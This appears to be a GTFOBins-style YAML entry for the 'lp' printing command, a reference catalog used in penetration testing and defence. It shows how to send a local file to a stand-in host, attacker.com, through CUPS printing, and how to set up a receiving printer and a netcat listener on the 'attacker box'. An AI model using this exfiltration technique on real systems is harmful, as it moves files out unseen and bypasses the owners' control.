---
functions:
  file-upload:
    - description: |
        To collect the file run the following on the attacker box (this requires `cups` to be installed):

        1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
        2. `lpadmin -d printer` to set the new printer as default;
        3. `cupsctl --remote-any` to enable printing from the Internet;
        4. `nc -lkp 9100` to receive the file.

        Send a local file to a CUPS server.
      code: |
        LFILE=file_to_send
        RHOST=attacker.com
        lp $LFILE -h $RHOST
---
